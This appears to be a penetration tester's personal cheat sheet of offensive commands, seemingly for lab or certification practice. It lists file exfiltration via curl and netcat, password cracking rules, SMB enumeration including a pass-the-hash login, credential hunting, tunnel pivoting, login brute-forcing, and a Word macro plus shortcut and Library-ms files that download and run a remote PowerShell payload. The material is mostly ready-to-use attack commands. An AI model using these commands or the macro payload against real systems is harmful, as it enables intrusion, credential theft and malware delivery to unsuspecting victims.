# others

```
- (F) Full Control
- (M) Modify
- (W) Write

- System: SYSTEM (kernel / NT auth)
- High: Elevated users
- Medium: Standard users
- Low: Very restricted rights, used in sandboxed
- Untrusted: extremely limited access rights for processes or objects that pose the most potential risk



$password = ConvertTo-SecureString "Password123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("testuser", $password)
Enter-PSSession -ComputerName dc.testcom -Credential $cred
whoami


```

# file upload

```
python3 -m uploadserver 8000

needs to be in cmd
curl IP:PORT/upload -F "files=@OpenPop.dll"


$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\test.txt' -Encoding Byte))

Invoke-WebRequest -Uri http://IP/ -Method POST -Body $b64

nc -lvnp 80 >> filename.txt
```

# cracking rules

```
ls -la /usr/share/hashcat/rules/
best64rule
/usr/share/hashcat/rules/rockyou-30000.rule -

when cracking use --force at the end if with rule

john rules

cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'

 john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules 
```

# SMB

```
to get all directory
mount -t cifs //IP/Folder/

exfil for faster enum
cp -r mounts folderpath

smbmap -H IP -u username -p password -r 'transfer' --depth 2


null
crackmapexec smb IP/24 -u 'username' -p 'password' --shares --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol



smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b


transfer file via smb

impacket-smbserver -smb2support share /tmp/share -user kali -password kali


net use \\IP\share /user:kali kali

copy test.txt \\IP\share\Database.kdbx
```

# passwords

```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini


dir /s *pass* == *cred* == *vnc* == *.config*


findstr /spin "password" *.*
findstr /spin "password" *.*
```

# Pivot

```
ligolo
kali
./proxy -selfcert -laddr 0.0.0.0:443


target
./agent -connect kaliIP:443 -ignore-cert

sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add targIP/24 dev ligolo

sudo ip route add targIP/24 dev ligolo
```


# webapp

```
found a potential user ?
always try default creds as their username such as user:user
server running version for exploit

symfony https://infosecwriteups.com/how-i-was-able-to-
glpi https://senderend.medium.com/pg-practice-box-deep-dive-glpi-c3a1cf1520f8

```

```
find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144
debug.txt
robots.txt
web.config
.htaccess
sitemap.xml
.DS_Store

recursively fuzz for .php extension or do upload.php for each dir

1. Consider using the /usr/share/wordlists/dirb/common.txt wordlist.
2. Use the -x parameter in the gobuster command to specify the filetype as PDF.
```

```
basic auth bruteforce

hydra -l admin -P /usr/share/wordlists/rockyou.txt -s PORT -f IP http-get -I

http login ffuf
 ffuf -w /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -X POST -d "username=FUZZ&&password=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://IP

mostly on employee portal or sorts of 
getting access denied ? and you have registration
try to register a user with a domain or something related to the host like on the contact address info@company.com
test@company.com your username

try xpath just in case

port 9000 fastcgi

```

# network

```
UDP
ALL TCP ports

impacket-mssqcl -windows-auth
```

# wordlist

```
/usr/share/wordlists/fasttrack.txt
/usr/share/wordlists/rockyou.txt
```


## word macro

```
view -> Macros > add the payload > save as docm or macro enabled document

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    Str = Str + "powershell.exe -c IEX(iwr -UseBasicParsing http://IP/test.ps1) "
    CreateObject("Wscript.Shell").Run Str
End Sub
```

```
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /tmp/totransfer

powershell.lnk
powershell.exe -c "IEX(iwr -UseBasicParsing http://IP/test.ps1)"

type config.Library-ms

<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://IP</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```